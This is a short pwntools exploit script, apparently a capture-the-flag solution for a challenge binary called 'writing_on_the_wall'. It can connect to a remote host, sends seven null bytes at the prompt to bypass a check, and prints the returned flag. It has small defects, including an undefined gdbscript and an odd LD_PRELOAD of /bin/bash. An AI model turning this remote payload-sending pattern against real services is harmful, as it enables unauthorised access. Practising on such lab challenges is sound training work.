#!/usr/bin/env python3
from pwn import *
import os

def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD": "/bin/bash"}
        )
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


prompt = ">> ".encode("utf-8")
slap = lambda y: p.sendlineafter(prompt, y)

exe = "./writing_on_the_wall_patched"
elf = context.binary = ELF(exe, checksec=False)

p = start()

slap(b"\x00" * 7)

flag = p.recvline().split()[-1].decode()
info("Flag: " + flag)

